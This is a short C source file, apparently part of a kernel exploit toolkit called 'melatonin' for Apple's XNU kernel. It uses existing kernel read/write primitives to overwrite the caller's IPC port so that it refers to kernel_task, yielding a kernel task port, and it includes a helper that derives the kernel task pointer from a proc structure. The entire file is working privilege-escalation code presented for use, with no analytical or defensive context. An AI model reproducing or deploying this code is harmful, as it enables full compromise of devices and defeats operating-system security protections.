#include "melatonin.h"
#include "offsets.h"

/* make ip3 self port a live kernel task port */
int task_port_takeover(kva_t self_task, kva_t kernel_task) {
    if (!mela_krw_ready() || !self_task || !kernel_task) return -1;

    kva_t port = kread64(self_task + g_off.task_itk);
    if (!mela_is_kptr(port)) return -1;

    /* ip_object.io_bits: ACTIVE | IKOT_TASK */
    uint64_t word = kread64(port);
    word &= ~0x00000000FFFFFFFFULL;
    word |= 0x80000002ULL;
    if (kwrite64(port, word) != 0) return -1;

    /* ip_kobject -> kernel_task */
    if (kwrite64(port + g_off.ipc_port_kobject, kernel_task) != 0) return -1;

    g_mela.kern_task = kernel_task;
    return 0;
}

/* derive the kernel task pointer from launchd */
kva_t task_kernel_from_proc(kva_t kern_proc) {
    if (!kern_proc) return 0;
    return kread64(kern_proc + g_off.proc_task);
}
